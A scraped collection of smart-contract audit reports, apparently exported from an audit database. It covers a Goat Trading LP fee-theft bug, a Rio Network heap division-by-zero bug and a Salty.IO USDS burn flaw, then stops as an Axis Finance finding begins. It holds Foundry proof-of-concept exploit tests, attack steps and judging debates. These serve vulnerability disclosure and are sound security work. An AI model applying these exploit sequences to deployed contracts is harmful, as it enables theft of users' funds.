        uint256 hackerInitialLpBalance = pair.balanceOf(hacker);
        uint256 hackerInitialWethBalance = weth.balanceOf(hacker);

        // Wait until lock time is over
        vm.warp(pair.lockedUntil(hacker) + 1);
        
        {//give user weth
        address swappingUser = address(0x002);

        uint256 wethSwap = 1e18;
        vm.deal(swappingUser, wethSwap);

        vm.startPrank(swappingUser);
        weth.deposit{value: wethSwap}();
        
        // simulate user swaps to add fees to protocol
        weth.transfer(address(pair), wethSwap);

        (uint wethReserveBefore, uint tokenReserveBefore) = pair.getReserves();
        uint amountTokenOut = GoatLibrary.getTokenAmountOutAmm(
            wethSwap,
            wethReserveBefore,
          tokenReserveBefore 
        );
        pair.swap(amountTokenOut, 0, swappingUser);
        vm.stopPrank();
        }

        (uint256 reservesWethAfterSwap, ) = pair.getReserves();

        console.log(""the LPToken balance of the inital LP"", initialLPBalance * 10000 / pair.totalSupply(), ""BPS"");
        console.log(""the LPToken balance of the hacker"", hackerInitialLpBalance * 10000 / pair.totalSupply(), ""BPS"");
        
        console.log(""the fees unclaimed by the initial LP:"", pair.earned(users.lp));
        
        //the hacker withdraws his fees
        vm.startPrank(hacker);
        console.log(""fees unclaimed by hacker:"", pair.earned(hacker));

        pair.withdrawFees(hacker);
        console.log(""fee received by hacker:"", weth.balanceOf(hacker) - hackerInitialWethBalance);

        // Transfer LPs to pair itself
        pair.transfer(address(pair), hackerInitialLpBalance);

        console.log(""amount of pending liquidity fees:"", pair.getPendingLiquidityFees());
        //the hacker withdraws the fees of the pair
        uint256 feesUnclaimedByPair = pair.earned(address(pair));
        console.log(""fees unclaimed by the pair:"", pair.earned(address(pair)));
        pair.withdrawFees(address(pair));
        console.log(""amount of pending liquidity fees after withdrawing fees by the pair"", pair.getPendingLiquidityFees());

        //get hacker tocken amount:
        {
            uint256 hackerTokenBalanceBefore = goat.balanceOf(hacker);
            uint256 hackerWethBalanceBefore = weth.balanceOf(hacker);
            console.log(""hacker token balance before:"", hackerTokenBalanceBefore);
            console.log(""hacker weth balance before:"", hackerWethBalanceBefore);

            // hacker swaps the stolen weth fee to Tokens.
            (uint wethReserveBefore, uint tokenReserveBefore) = pair.getReserves();
            uint amountTokenOut = GoatLibrary.getTokenAmountOutAmm(
                feesUnclaimedByPair,
                wethReserveBefore,
            tokenReserveBefore 
            );

            pair.swap(amountTokenOut, 0, hacker);
            
            console.log(""hacker token balance after swap:"", goat.balanceOf(hacker));
            console.log(""hacker weth balance after swap:"", weth.balanceOf(hacker));

            //asseting that the hacker got tokens out of the swap, without providing any weth to the pair
            assert(hackerTokenBalanceBefore < goat.balanceOf(hacker));
            assert(hackerWethBalanceBefore == weth.balanceOf(hacker));

            //the hacker burns the lpTokens transfered to the pair so he loses nothing
            pair.burn(hacker);

            vm.stopPrank();
        }
```

1. Attacker deposits liquidity, acquiring 50% of LP tokens.
2. Initial liquidity provider holds the remaining 50% of LP tokens.
3. Swaps are simulated, generating fees for all LP holders

### Attack Sequence:

1. Initial Check: Both the attacker and the initial LP have unclaimed fees.
2. Attacker Withdraws: Attacker withdraws their earned fees.
3. Attacker transfers to the vault his entire balance
4. Fees Stolen: Attacker calls withdrawFees on the pair, claiming the accumulated fees and reducing the _pendingLiquidityFees balance.
5. attacker burns the liquidity he transfered to the pair.
6. attacker swaps the Eth that was gotten from ther liquidity providers fees, and claimed by the pool
7. When the initial LP attempts to withdraw fees, the transaction reverts due to insufficient _pendingLiquidityFees

- as this scenario shows any liquidity provider with a portion of LPTokens can steal all the fees of other LP's.

the output logs:
```solidity
the LPToken balance of the inital LP 4999 BPS
the LPToken balance of the hacker 5000 BPS


the fees unclaimed by the initial LP: 1979999999999999
fees unclaimed by hacker: 1980000000000000

fee received by hacker: 1980000000000000

amount of pending liquidity fees: 1980000000000000

fees unclaimed by the pair: 1980000000000000
amount of pending liquidity fees after withdrawing fees by the pair 0

hacker token balance before: 100000000000000000000
hacker weth balance before: 1001980000000000000
hacker token balance after swap: 100044491256996732169
hacker weth balance after swap: 1001980000000000000
```

make this issue a high severity.

**zzykxx**

Escalate

This should be high severity. The POC in my report shows an attacker stealing all currently pending fees from a pool. @adamidarrha also explains why this should be high severity according to the rules.

**sherlock-admin2**

> Escalate
> 
> This should be high severity. The POC in my report shows an attacker stealing all currently pending fees from a pool. @adamidarrha also explains why this should be high severity according to the rules.

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**RobertMCForster**

This is confirmed as a high severity bug.

**cvetanovv**

For me, this issue is borderline High/Medium, but I don't think stealing a fee can be High. The values in the example are strongly exaggerated. Most likely, even with minimal accumulation, they will be immediately withdrawn.

**Evert0x**

I believe it should by High severity as the following description applies
> Definite loss of funds without (extensive) limitations of external conditions.

Planning to accept escalation and make High severity

**ahmedAdam1337**

@cvetanovv  the issue describes how a liquidity provider can basically gain double his rewards. for example if he had 5% of lpTokens he should get 5% of the rewards, but with this attack path he would be able to get 10%, and it can be done again and again and not just one time, the example we gave is about a lp with 50% can basically gain 100% of the rewards leaving nothing to other lp's.

1. 'I don't think stealing a fee can be High': it's not stealing fees , it's stealing all rewards accrued to liquidity providers, the sole purpose of providing liquidity in a dex pool is to get the swap fees, if lp's dont get their fees they withdraw their liquidity ,no liquidity no swaps.

2. 'The values in the example are strongly exaggerated': the examples provided are with a user holding 50% of lpTokens , which is not unrealistic nor exagerated, but the attack can be carried on with any % of lpTokens.

3. 'Most likely, even with minimal accumulation, they will be immediately withdrawn': fees are gotten from swaps which can happen anytime, lp's arent going to be just withdrawing fees whenever a swap happens. the attacker can also do this attack whenever because it's a 4 step attack (withdrawFees -> transfer lp tokens to vault -> burn tokens (swap) if any left to get out the rewards).

this is why i think it should be a high.

**Evert0x**

Result:
High
Has Duplicates

**sherlock-admin3**

Escalations have been resolved successfully!

Escalation status:
- [zzykxx](https://github.com/sherlock-audit/2024-03-goat-trading-judging/issues/63/#issuecomment-2041352625): accepted

**FastTiger777**

I think this is medium. As the following language fits the impact the best.

> V. How to identify a medium issue:
 Breaks core contract functionality, rendering the contract useless or leading to loss of funds.",Goat Trading,zzykxx|C1rdan|AhmedAdam,HIGH,,14405 USDC,0,0,0,https://github.com/sherlock-audit/2024-03-goat-trading-judging/issues/63,,,https://app.sherlock.xyz/audits/contests/178,solodit_reports,,2024-04-22 21:12:34,2024-10-15 01:41:59,1,"if (to != address(this)) {
            _updateFeeRewards(to);
        }
```
    function withdrawFees(address to) external {
```
            _pendingLiquidityFees -= uint112(totalFees);
```
    function swap(uint256 amountTokenOut, uint256 amountWethOut, address to) external nonReentrant {",
1745119,cdf64b69f6fc6122c9fc73783323b358,H-8: Heap is incorrectly stores the removed operator ID which can lead to division by zero in deposit/withdrawal flow,Sherlock,2024-03-07,"# Issue H-8: Heap is incorrectly stores the removed operator ID which can lead to division by zero in deposit/withdrawal flow 

Source: https://github.com/sherlock-audit/2024-02-rio-network-core-protocol-judging/issues/193 

## Found by 
almurhasan, itsabinashb, lemonmon, mstpr-brainbot, shaka, thec00n
## Summary
An operator's strategy can be reset by the owner calling `setOperatorStrategyCaps` to ""0"". This action sets the utilization to ""0"" and removes the operator from the heap. Consequently, this means that the operator has unwound all its strategy shares and can no longer receive any more deposits. However, due to how the heap is organized, if an operator who had funds before is reset to ""0"", the heap will not successfully remove the operator. As a result, when ordering the heap, a division by ""0"" will occur, causing the transaction to revert on deposits and withdrawals indefinitely.
## Vulnerability Detail
In order to break down the issue, let's divide the issue to 2 parts which their combination is the issue itself

**1- Heap is not removing the removed ID from the heaps storage when the operator is removed**

When the operator is removed, the operator will be removed from the heap as follows:
```solidity
function setOperatorStrategyCap(
        RioLRTOperatorRegistryStorageV1.StorageV1 storage s,
        uint8 operatorId,
        IRioLRTOperatorRegistry.StrategyShareCap memory newShareCap
    ) internal {
        .
        OperatorUtilizationHeap.Data memory utilizationHeap = s.getOperatorUtilizationHeapForStrategy(newShareCap.strategy);
        // If the current cap is greater than 0 and the new cap is 0, remove the operator from the strategy.
        if (currentShareDetails.cap > 0 && newShareCap.cap == 0) {
            // If the operator has allocations, queue them for exit.
            if (currentShareDetails.allocation > 0) {
                operatorDetails.queueOperatorStrategyExit(operatorId, newShareCap.strategy);
            }
            // Remove the operator from the utilization heap.
            -> utilizationHeap.removeByID(operatorId);
        }
        .

        // Persist the updated heap to the active operators tracking.
        -> utilizationHeap.store(s.activeOperatorsByStrategyShareUtilization[newShareCap.strategy]);
         .
    }
```

`removeByID` calls the internal `_remove` function which is **NOT** removes the last element! `self.count` is decreased however, the index is still the previous value of the `self.count`
```solidity
function _remove(Data memory self, uint8 i) internal pure {
        self.operators[i] = self.operators[self.count--];
    }
```

**For example, if there are 3 operators as follows:**
operatorId: 1, utilization: 50%
operatorId: 2, utilization: 60%
operatorId: 3, utilization: 70%
then, the `heap.count` would be 3
and the order would be: 1, 2, 3 in the heap
heap.operators[1] = operatorId 1
heap.operators[2] = operatorId 2
heap.operators[3] = operatorId 3

**if we remove the operator Id 2:**
`heap.count` = 2
order: 1,3
heap.operators[1] = operatorId 1
heap.operators[2] = operatorId 2
**heap.operators[3] = operatorId 0**  THIS SHOULD BE ""0"" since its removed but it is ""3"" in the current implementation!

As shown here, the operators[3] should be ""0"" since there isn't any operator3 in the heap anymore but the heap keeps the value and not resets it. 

**Here a test shows the above issue:**
```solidity
// forge test --match-contract OperatorUtilizationHeapTest --match-test test_removingDoesNotUpdatesStoredHeap -vv
    function test_removingDoesNotUpdatesStoredHeap() public {
        OperatorUtilizationHeap.Data memory heap = OperatorUtilizationHeap.initialize(5);

        heap.insert(OperatorUtilizationHeap.Operator({id: 1, utilization: 50}));
        heap.store(heapStore);

        heap.insert(OperatorUtilizationHeap.Operator({id: 2, utilization: 60}));
        heap.store(heapStore);

        heap.insert(OperatorUtilizationHeap.Operator({id: 3, utilization: 70}));
        heap.store(heapStore);

        console.log(""Heaps count"", heap.count);
        console.log(""1st"", heap.operators[1].id);
        console.log(""2nd"", heap.operators[2].id);
        console.log(""3rd"", heap.operators[3].id);

        // remove 2
        heap.removeByID(3);
        heap.store(heapStore);

        console.log(""Heaps count"", heap.count);
        console.log(""1st"", heap.operators[1].id);
        console.log(""2nd"", heap.operators[2].id);
        console.log(""3rd"", heap.operators[3].id);
    }
```
**Logs:**
<img width=""563"" alt=""image"" src=""https://github.com/sherlock-audit/2024-02-rio-vesting-core-protocol-mstpr/assets/120012681/72ce2e8c-dd74-4e77-9bd7-f1096923165e"">


**2- When the operator cap is reseted the allocations/deallocations will not work due to above heap issue because of division by zero**

Now, take the above example, we removed the operatorId 3 from the heap by setting its cap to ""0"". Now, there are only operators 1 and 2 active for that specific strategy.
When there are idle funds in the deposit pool before the rebalance call, the excess funds that are not requested as withdrawals will be pushed to EigenLayer as follows:
```solidity
function rebalance(address asset) external checkRebalanceDelayMet(asset) {
       .
       .
        -> (uint256 sharesReceived, bool isDepositCapped) = depositPool().depositBalanceIntoEigenLayer(asset);
        .
    }
```
```solidity
 function depositBalanceIntoEigenLayer(address asset) external onlyCoordinator returns (uint256, bool) {
        uint256 amountToDeposit = asset.getSelfBalance();
        if (amountToDeposit == 0) return (0, false);
        .
        .
        -> return (OperatorOperations.depositTokenToOperators(operatorRegistry(), asset, strategy, sharesToAllocate), isDepositCapped);
    }
```

```solidity
function depositTokenToOperators(
        IRioLRTOperatorRegistry operatorRegistry,
        address token,
        address strategy,
        uint256 sharesToAllocate
    ) internal returns (uint256 sharesReceived) {
       -> (uint256 sharesAllocated, IRioLRTOperatorRegistry.OperatorStrategyAllocation[] memory  allocations) = operatorRegistry.allocateStrategyShares(
            strategy, sharesToAllocate
        );
        .
        .
    }
```
```solidity
function allocateStrategyShares(address strategy, uint256 sharesToAllocate) external onlyDepositPool returns (uint256 sharesAllocated, OperatorStrategyAllocation[] memory allocations) {
        -> OperatorUtilizationHeap.Data memory heap = s.getOperatorUtilizationHeapForStrategy(strategy);
       .
       .
       .
       .
    }
```

```solidity
function getOperatorUtilizationHeapForStrategy(RioLRTOperatorRegistryStorageV1.StorageV1 storage s, address strategy) internal view returns (OperatorUtilizationHeap.Data memory heap) {
        uint8 numActiveOperators = s.activeOperatorCount;
        if (numActiveOperators == 0) return OperatorUtilizationHeap.Data(new OperatorUtilizationHeap.Operator[](0), 0);
        
        heap = OperatorUtilizationHeap.initialize(MAX_ACTIVE_OPERATOR_COUNT);
        LibMap.Uint8Map storage operators = s.activeOperatorsByStrategyShareUtilization[strategy];

        IRioLRTOperatorRegistry.OperatorShareDetails memory operatorShares;
        unchecked {
            uint8 i;
            for (i = 0; i < numActiveOperators; ++i) {
                uint8 operatorId = operators.get(i);

                // Non-existent operator ID. We've reached the end of the heap.
                if (operatorId == 0) break;

                operatorShares = s.operatorDetails[operatorId].shareDetails[strategy];
                heap.operators[i + 1] = OperatorUtilizationHeap.Operator({
                    id: operatorId,
                    -> utilization: operatorShares.allocation.divWad(operatorShares.cap)
                });
            }
            heap.count = i;
        }
    }
```
As we can see in one above code snippet, the `numActiveOperators` is 3. Since the stored heaps last element is not set to ""0"" it will point to operatorId 3 which has a cap of ""0"" after the removal. This will make the
```solidity
utilization: operatorShares.allocation.divWad(operatorShares.cap)
```
part of the code to perform a division by zero and the function will revert. 

**Coded PoC:**
```solidity
// forge test --match-contract RioLRTOperatorRegistryTest --match-test test_Capped0ValidatorBricksFlow -vv
    function test_Capped0ValidatorBricksFlow() public {
        // Add 3 operators
        addOperatorDelegators(reLST.operatorRegistry, address(reLST.rewardDistributor), 3);

        // The caps for each operator is 1000e18, we will delete the id 2 so we need funds there
        // any number that is more than 1000 should be ok for that experiement 
        uint256 AMOUNT = 1002e18;

        // Allocate to cbETH strategy.
        cbETH.approve(address(reLST.coordinator), type(uint256).max);
        uint256 lrtAmount = reLST.coordinator.deposit(CBETH_ADDRESS, AMOUNT);

        // Push funds into EigenLayer.
        vm.prank(EOA, EOA);
        reLST.coordinator.rebalance(CBETH_ADDRESS);

        // Build the empty caps
        IRioLRTOperatorRegistry.StrategyShareCap[] memory zeroStrategyShareCaps =
            new IRioLRTOperatorRegistry.StrategyShareCap[](1);
        zeroStrategyShareCaps[0] = IRioLRTOperatorRegistry.StrategyShareCap({strategy: CBETH_STRATEGY, cap: 0});

        // Set the caps of CBETH_STRATEGY for operator 2 as ""0""
        reLST.operatorRegistry.setOperatorStrategyShareCaps(2, zeroStrategyShareCaps);

        // Try an another deposit, we expect revert when we do the rebalance
        reLST.coordinator.deposit(CBETH_ADDRESS, 10e18);

        // Push funds into EigenLayer. Expect revert, due to division by ""0""
        skip(reETH.coordinator.rebalanceDelay());
        vm.startPrank(EOA, EOA);
        vm.expectRevert(bytes4(keccak256(""DivWadFailed()"")));
        reLST.coordinator.rebalance(CBETH_ADDRESS);
        vm.stopPrank();
    }
```
## Impact
Core logic broken, withdrawal/deposits can not be performed. 
## Code Snippet
https://github.com/sherlock-audit/2024-02-rio-network-core-protocol/blob/4f01e065c1ed346875cf5b05d2b43e0bcdb4c849/rio-sherlock-audit/contracts/utils/OperatorRegistryV1Admin.sol#L231C5-L270C6

https://github.com/sherlock-audit/2024-02-rio-network-core-protocol/blob/4f01e065c1ed346875cf5b05d2b43e0bcdb4c849/rio-sherlock-audit/contracts/utils/OperatorUtilizationHeap.sol#L94-L110

https://github.com/sherlock-audit/2024-02-rio-network-core-protocol/blob/4f01e065c1ed346875cf5b05d2b43e0bcdb4c849/rio-sherlock-audit/contracts/restaking/RioLRTCoordinator.sol#L121-L151

https://github.com/sherlock-audit/2024-02-rio-network-core-protocol/blob/4f01e065c1ed346875cf5b05d2b43e0bcdb4c849/rio-sherlock-audit/contracts/restaking/RioLRTDepositPool.sol#L47-L67

https://github.com/sherlock-audit/2024-02-rio-network-core-protocol/blob/4f01e065c1ed346875cf5b05d2b43e0bcdb4c849/rio-sherlock-audit/contracts/utils/OperatorOperations.sol#L51-L68

https://github.com/sherlock-audit/2024-02-rio-network-core-protocol/blob/4f01e065c1ed346875cf5b05d2b43e0bcdb4c849/rio-sherlock-audit/contracts/restaking/RioLRTOperatorRegistry.sol#L342-L392

https://github.com/sherlock-audit/2024-02-rio-network-core-protocol/blob/4f01e065c1ed346875cf5b05d2b43e0bcdb4c849/rio-sherlock-audit/contracts/utils/OperatorRegistryV1Admin.sol#L327-L351
## Tool used

Manual Review

## Recommendation
When removing from the heap also remove the last element from the heap.

**I am not sure of this, but this might work**
```solidity
function _remove(Data memory self, uint8 i) internal pure {
        self.operators[i] = self.operators[--self.count];
    }
```



## Discussion

**sherlock-admin4**

The protocol team fixed this issue in PR/commit https://github.com/rio-org/rio-sherlock-audit/pull/3.

**nevillehuang**

Severity could be higher, given a use of the function correctly results in blocking of withdrawals. Leaving medium for now on grounds of admin error

**shaka0x**

Escalate

> Leaving medium for now on grounds of admin error.

I respectfully disagree with this reasoning. I think the severity of the issue and its duplicate should be high, as there is no admin error involved. There is an error in the implementation that is produced after an admin action. Otherwise, all issues at deployment or in protected functions can technically be considered as admin errors.





**sherlock-admin2**

> Escalate
> 
> > Leaving medium for now on grounds of admin error.
> 
> I respectfully disagree with this reasoning. I think the severity of the issue and its duplicate should be high, as there is no admin error involved. There is an error in the implementation that is produced after an admin action. Otherwise, all issues at deployment or in protected functions can technically be considered as admin errors.
> 
> 
> 
> 

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**nevillehuang**

Agree that this issue should be high severity since withdrawals can be blocked permanently

**Czar102**

@nevillehuang @mstpr can't the admin remediate the situation?

**nevillehuang**

@solimander Could you confirm if admin remediation is possible by resetting validator cap of removed operator? Given the intended admin workflow results in blocking of funds I think the impact is severe

**solimander**

@nevillehuang Remediation is possible by deactivating the operator:

```solidity
// forge test --mt test_capped0ValidatorBricksFlowRecovery
function test_capped0ValidatorBricksFlowRecovery() public {
    // Add 3 operators
    addOperatorDelegators(reLST.operatorRegistry, address(reLST.rewardDistributor), 3);

    // The caps for each operator is 1000e18, we will delete the id 2 so we need funds there
    // any number that is more than 1000 should be ok for that experiement
    uint256 AMOUNT = 1002e18;

    // Allocate to cbETH strategy.
    cbETH.approve(address(reLST.coordinator), type(uint256).max);
    uint256 lrtAmount = reLST.coordinator.deposit(CBETH_ADDRESS, AMOUNT);

    // Push funds into EigenLayer.
    vm.prank(EOA, EOA);
    reLST.coordinator.rebalance(CBETH_ADDRESS);

    // Build the empty caps
    IRioLRTOperatorRegistry.StrategyShareCap[] memory zeroStrategyShareCaps =
        new IRioLRTOperatorRegistry.StrategyShareCap[](1);
    zeroStrategyShareCaps[0] = IRioLRTOperatorRegistry.StrategyShareCap({strategy: CBETH_STRATEGY, cap: 0});

    // Set the caps of CBETH_STRATEGY for operator 2 as ""0""
    reLST.operatorRegistry.setOperatorStrategyShareCaps(2, zeroStrategyShareCaps);

    // Try an another deposit, we expect revert when we do the rebalance
    reLST.coordinator.deposit(CBETH_ADDRESS, 10e18);

    // Push funds into EigenLayer. Expect revert, due to division by ""0""
    skip(reETH.coordinator.rebalanceDelay());
    vm.startPrank(EOA, EOA);
    vm.expectRevert(bytes4(keccak256('DivWadFailed()')));
    reLST.coordinator.rebalance(CBETH_ADDRESS);
    vm.stopPrank();

    // Deactivate the operator to recover the system
    reLST.operatorRegistry.deactivateOperator(2);

    // Rebalance succeeds
    vm.prank(EOA, EOA);
    reLST.coordinator.rebalance(CBETH_ADDRESS);
}
```

This acts as a temporary fix, which would unblock rebalances while the issue is patched.

**mstpr**

> @nevillehuang @mstpr can't the admin remediate the situation?

not really.

The admin needs to reset the cap for the operator. However, when this happens, the operator's cap is reset to ""0,"" allowing deposits to be made again. If the admin sets an operator's cap to ""0,"" it's likely that the operator will not be used. To address the above issue, the admin must reset it to a value. However, this means that new deposits can be made to the operator. Although the admin can set the cap back to a value, all users must withdraw their funds before new deposits are made. Since the admin does not control all users, this is not feasible and cannot be fixed in my opinion.


If the operator is deactivated instead of its cap resetted to ""0"" then it is even worse. Then, the admin has to readd the operator back to system and needs to push funds to that operator such that the heap reorders correctly. Though, to do that admin needs significant amount of funds to push to system to increase the utilization. 

Overall it might be possible but it is extremely hard and requires capital. What do you think @shaka0x @itsabinashb ?


**shaka0x**

> > @nevillehuang @mstpr can't the admin remediate the situation?
> 
> not really.
> 
> The admin needs to reset the cap for the operator. However, when this happens, the operator's cap is reset to ""0,"" allowing deposits to be made again. If the admin sets an operator's cap to ""0,"" it's likely that the operator will not be used. To address the above issue, the admin must reset it to a value. However, this means that new deposits can be made to the operator. Although the admin can set the cap back to a value, all users must withdraw their funds before new deposits are made. Since the admin does not control all users, this is not feasible and cannot be fixed in my opinion.
> 
> If the operator is deactivated instead of its cap resetted to ""0"" then it is even worse. Then, the admin has to readd the operator back to system and needs to push funds to that operator such that the heap reorders correctly. Though, to do that admin needs significant amount of funds to push to system to increase the utilization.
> 
> Overall it might be possible but it is extremely hard and requires capital. What do you think @shaka0x @itsabinashb ?

I do agree with the above comments and would like to add that the proposed solution will not work for the cases described in my PoCs (https://github.com/sherlock-audit/2024-02-rio-network-core-protocol-judging/issues/316), where the bug appears after deactivating an operator.

**Czar102**

@solimander do you agree with the above comments?

@itsabinashb please do not post unnecessarily long code/result snippets directly in a comment, it's better to put them in a gist.

If @solimander agrees, I'm planning to accept the escalation and consider this issue a valid High severity one.

**solimander**

@Czar102 After reviewing @shaka0x's POCs, I do agree with the above comments.

**Czar102**

Result:
High
Has duplicates

**sherlock-admin3**

Escalations have been resolved successfully!

Escalation status:
- [shaka0x](https://github.com/sherlock-audit/2024-02-rio-network-core-protocol-judging/issues/193/#issuecomment-2023444945): accepted

**zrax-x**

@nevillehuang Is [issue#16](https://github.com/sherlock-audit/2024-02-rio-network-core-protocol-judging/issues/16) a duplicate? I can't seem to understand what the problem described in [issue#16](https://github.com/sherlock-audit/2024-02-rio-network-core-protocol-judging/issues/16) is.  I believe that it misses the point and has no negative impact.
And [issue#155](https://github.com/sherlock-audit/2024-02-rio-network-core-protocol-judging/issues/155), [issue#127](https://github.com/sherlock-audit/2024-02-rio-network-core-protocol-judging/issues/127).

**itsabinashb**

> Is [issue#16](https://github.com/sherlock-audit/2024-02-rio-network-core-protocol-judging/issues/16) a duplicate? I can't seem to understand what the problem described in [issue#16](https://github.com/sherlock-audit/2024-02-rio-network-core-protocol-judging/issues/16) is. I believe that it misses the point and has no negative impact. And [issue#155](https://github.com/sherlock-audit/2024-02-rio-network-core-protocol-judging/issues/155).

Issue number 16 shows exact root cause which is same as this submission.

**zrax-x**

> > Is [issue#16](https://github.com/sherlock-audit/2024-02-rio-network-core-protocol-judging/issues/16) a duplicate? I can't seem to understand what the problem described in [issue#16](https://github.com/sherlock-audit/2024-02-rio-network-core-protocol-judging/issues/16) is. I believe that it misses the point and has no negative impact. And [issue#155](https://github.com/sherlock-audit/2024-02-rio-network-core-protocol-judging/issues/155).
> 
> Issue number 16 shows exact root cause which is same as this submission.

However, you did not accurately describe the harm caused, which is ""division by zero"".

**solimander**

I do agree that #16 does sort of miss the point as the core issue is not mentioned. The issue is not that the removed operator ID still exists in memory, but that it's not correctly removed from storage.",Rio Network,lemonmon|thec00n|shaka|mstpr-brainbot|itsabinashb|almurhasan,HIGH,,62000 USDC,0,0,0,https://github.com/sherlock-audit/2024-02-rio-network-core-protocol-judging/issues/193,,,https://app.sherlock.xyz/audits/contests/176,solodit_reports,,2024-04-15 21:12:13,2024-10-15 01:27:29,1,,
1745209,4a886dd8175137ce17b3337944d7fd65,"[H-06] When borrowers repay USDS, it is sent to the wrong address, allowing anyone to burn Protocol Owned Liquidity and build bad debt for USDS",Code4rena,2024-01-16,"When a user repays the USDS he has borrowed, it is taken from him and kept for burning. The Liquidizer contract is updated with the new amount repaid. The USDS is burnt whenever the `performUpkeep` function is called on Liquidizer by the Upkeep contract during upkeep.

The USDS collected is sent to the USDS contract which can be burned whenever `burnTokensInContract` is called. The amount of USDS to be burnt in the Liquidizer contract is also increased by the `incrementBurnableUSDS` call. This increases the `usdsThatShouldBeBurned` variable on the Liquidizer.

```solidity
     function repayUSDS( uint256 amountRepaid ) external nonReentrant{
       ...		
       usds.safeTransferFrom(msg.sender, address(usds), amountRepaid);

       // Have USDS remember that the USDS should be burned
       liquidizer.incrementBurnableUSDS( amountRepaid );
       ...
     }
```

During upkeep, the Liquidizer first checks if it has enough USDS balance to burn i.e `usdsBalance >= usdsThatShouldBeBurned`. If it does it burns them else it converts Protocol Owned Liquidity (POL) to USDS and burns it to cover the deficit. Burning POL allows the protocol to cover bad debt from liquidation.

```solidity
function _possiblyBurnUSDS() internal{
        ...
	uint256 usdsBalance = usds.balanceOf(address(this));
	if ( usdsBalance >= usdsThatShouldBeBurned )
	{
		// Burn only up to usdsThatShouldBeBurned.
		// Leftover USDS will be kept in this contract in case it needs to be burned later.
		_burnUSDS( usdsThatShouldBeBurned );
    		usdsThatShouldBeBurned = 0;
	}
	else
	{
		// The entire usdsBalance will be burned - but there will still be an outstanding balance to burn later
		_burnUSDS( usdsBalance );
		usdsThatShouldBeBurned -= usdsBalance;

		// As there is a shortfall in the amount of USDS that can be burned, liquidate some Protocol Owned Liquidity and
		// send the underlying tokens here to be swapped to USDS
		dao.withdrawPOL(salt, usds, PERCENT_POL_TO_WITHDRAW);
		dao.withdrawPOL(dai, usds, PERCENT_POL_TO_WITHDRAW);
	}
}
```

Since the `usdsThatShouldBeBurned` variable will always be increased without increasing the Liquidizer balance, it will always sell POL to cover the increase.

If the POL is exhausted, the protocol cannot cover bad debt generated from liquidations. This will affect the price of USDS negatively.

An attacker can borrow and repay multiple times to exhaust POL and create bad debt or it could just be done over time as users repay their USDS.

### Impact

This will affect the price of USDS negatively.

### Proof of Concept

This test can be run in [CollateralAndLiquidity.t.sol](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/tests/CollateralAndLiquidity.t.sol).

<details>

```solidity
    function testBurnPOL() public {
        // setup
        vm.prank(address(collateralAndLiquidity));
		usds.mintTo(address(dao), 20000 ether);

		vm.prank(address(teamVestingWallet));
		salt.transfer(address(dao), 10000 ether);

		vm.prank(DEPLOYER);
		dai.transfer(address(dao), 10000 ether);
        // create Protocol Owned Liquidity (POL)
        vm.startPrank(address(dao));
		collateralAndLiquidity.depositLiquidityAndIncreaseShare(salt, usds, 10000 ether, 10000 ether, 0, block.timestamp, false );
		collateralAndLiquidity.depositLiquidityAndIncreaseShare(dai, usds, 10000 ether, 10000 ether, 0, block.timestamp, false );
		vm.stopPrank();

        bytes32 poolIDA = PoolUtils._poolID(salt, usds);
		bytes32 poolIDB = PoolUtils._poolID(dai, usds);
		assertEq( collateralAndLiquidity.userShareForPool(address(dao), poolIDA), 20000 ether);
		assertEq( collateralAndLiquidity.userShareForPool(address(dao), poolIDB), 20000 ether);

        // Alice deposits collateral
        vm.startPrank(address(alice));
        wbtc.approve(address(collateralAndLiquidity), type(uint256).max);
        weth.approve(address(collateralAndLiquidity), type(uint256).max);
        collateralAndLiquidity.depositCollateralAndIncreaseShare(wbtc.balanceOf(alice), weth.balanceOf(alice), 0, block.timestamp, true );
        
        // Alice performs multiple borrows and repayments, increasing the 
        // usdsThatShouldBeBurned variable in Liquidizer
        for (uint i; i < 100; i++){
            vm.startPrank(alice);
            uint256 maxUSDS = collateralAndLiquidity.maxBorrowableUSDS(alice);
		    collateralAndLiquidity.borrowUSDS( maxUSDS );
            uint256 borrowed = collateralAndLiquidity.usdsBorrowedByUsers(alice);
            collateralAndLiquidity.repayUSDS(borrowed);
        }
        
        vm.startPrank(address(upkeep));
        // perform upkeep multiple times to cover bad debt
        // breaks when POL is exhausted
        for(;;){
            (, uint reserve1) = pools.getPoolReserves(dai, usds);
            if(reserve1 * 99 / 100 < 100) break;
            liquidizer.performUpkeep();
        }

        assertGt(liquidizer.usdsThatShouldBeBurned(), usds.balanceOf(address(liquidizer)));
    }
```

</details>

### Recommended Mitigation Steps

Send the repaid USDS to the Liquidizer.

**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/137#issuecomment-1950473170):**
 > The stablecoin framework: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS have been removed:
> 
> https://github.com/othernet-global/salty-io/commit/88b7fd1f3f5e037a155424a85275efd79f3e9bf9
> 


**Status:** Mitigation confirmed. Full details in reports from [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/66), [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/46), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/29).


***",Salty.IO,Aymen0909|djxploit|KingNFT|0xRobocop|chaduke|juancito|Toshii|ayden|0x3b|Jorgect|LeoGold|oakcobalt|lanrebayode77|1|2|wangxx2026|ether\_sky|nonseodion|0xanmol|klau5|Drynooo|0xAlix2|00xSEV|fnanni|pkqs90|israeladelaja|Ephraim|solmaxis69,HIGH,,80000,0,0,0,https://github.com/code-423n4/2024-01-salty-findings/issues/137,https://code4rena.com/reports/2024-01-salty,,https://code4rena.com/reports/2024-01-salty,solodit_reports,327484da0e64097f328c340cfdc48251,2024-04-22 21:11:57,2024-10-15 01:05:08,1,,
1745354,d5c5430a48947926d3d0274d2c9d25cf,H-3: Module's gas yield can never be claimed and all yield will be lost,Sherlock,2024-03-30,"# Issue H-3: Module's gas yield can never be claimed and all yield will be lost 

Source: https://github.com/sherlock-audit/2024-03-axis-finance-judging/issues/26 

## Found by 
Aymen0909, ether\_sky, hash, irresponsible, merlin, no, sl1
## Summary
Module's gas yield can never be claimed
## Vulnerability Detail
